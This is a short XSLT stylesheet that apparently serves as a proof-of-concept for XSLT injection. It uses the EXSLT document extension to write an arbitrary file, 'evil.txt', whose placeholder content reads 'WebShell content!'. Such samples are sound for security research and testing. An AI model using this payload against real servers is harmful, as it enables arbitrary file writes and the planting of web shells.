<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet
        xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:ptswarm="http://exslt.org/common"
    extension-element-prefixes="ptswarm"
    version="1.0">
<xsl:template match="/">

<ptswarm:document href="evil.txt" method="text">
        WebShell content!
</ptswarm:document>

</xsl:template>
</xsl:stylesheet>